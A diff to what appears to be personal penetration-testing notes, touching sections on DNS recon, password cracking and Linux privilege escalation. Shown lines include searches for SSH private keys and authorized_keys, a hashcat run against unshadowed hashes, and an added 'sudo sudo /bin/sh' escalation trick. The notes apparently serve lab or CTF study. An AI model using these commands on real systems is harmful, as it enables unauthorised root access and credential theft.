@@ -9,7 +9,7 @@ dnsrecon -r 127.0.0.1/24 -n <ip> -d <make up a domain>
 ```
 
 
-
+![[../Pasted image 20250617223840.png]]
 
 ![[../cheatsheet-file-transfers.pdf]]
 ## Linux Privilege Escalation 
@@ -33,7 +33,15 @@ hashcat -m 1800 unshadowed.txt rockyou.txt -O
 find / -name authorized_keys 2> /dev/null
 find / -name id_rsa 2> /dev/null 
 ```
+literally stupid, but this dumb trick works for old sudo 
+```
+sudo sudo /bin/sh
+```
 
+use ``` 
+grep -R .```
+to display everything in folder
+```
 Always go for a tty shell if you have a worse shell if possible
 
 use a command like [(see here)](https://wiki.zacheller.dev/pentest/privilege-escalation/spawning-a-tty-shell)
